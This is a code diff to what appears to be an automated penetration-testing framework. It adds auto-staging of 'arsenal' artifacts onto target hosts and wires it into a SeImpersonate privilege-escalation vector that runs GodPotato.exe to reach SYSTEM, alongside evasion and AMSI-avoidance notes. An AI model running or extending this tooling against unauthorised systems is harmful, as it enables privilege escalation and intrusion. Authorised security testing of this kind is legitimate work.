@@ -43,6 +43,9 @@ class Vector:
     report_type: str = ""    # the reportkb vector_type a proven finding records under
     family: str = None       # objective shared by delivery alternates (e.g. "seimpersonate")
     delivery: str = None     # the evasion.Technique key this vector's delivery presents
+    #: (arsenal_name, remote_path) artifacts this vector needs on the target — the loop
+    #: auto-stages these from the arsenal and retries when the target reports them missing.
+    stages: tuple = ()
 
     @property
     def score(self):
@@ -242,6 +245,7 @@ WIN_IMPERSONATION = (
          needs="GodPotato.exe staged in {stage}",
          command='{stage}\\GodPotato.exe -cmd "cmd /c whoami"',
          cleanup="del {stage}\\GodPotato.exe",
+         stages=(("GodPotato", "{stage}\\GodPotato.exe"),),
          detail="token impersonation to SYSTEM via GodPotato — a native PE on disk, no AMSI surface."),
     dict(key="seimpersonate:inmem", delivery="inmem-fileless", detection="moderate",
          title="SeImpersonate → SYSTEM (in-memory potato)",
@@ -264,6 +268,8 @@ def _impersonation_vector(spec, ctx, evidence):
     command = spec["command"].replace("{stage}", stage)
     cleanup = (spec.get("cleanup") or "").replace("{stage}", stage) or None
     detail = spec["detail"] + "  needs: " + spec["needs"].replace("{stage}", stage)
+    stages = tuple((name, path.replace("{stage}", stage))
+                   for name, path in spec.get("stages", ()))
     return Vector(
         key=spec["key"], title=spec["title"],
         exploitability="high", safety="config-change", detection=spec["detection"],
@@ -271,7 +277,7 @@ def _impersonation_vector(spec, ctx, evidence):
         evidence=evidence,
         safe_proof="the vector runs `whoami` in the SYSTEM context.",
         cleanup=cleanup, report_type="seimpersonate",
-        family="seimpersonate", delivery=spec["delivery"])
+        family="seimpersonate", delivery=spec["delivery"], stages=stages)
 
 
 def _win_vector(spec, ctx, evidence):
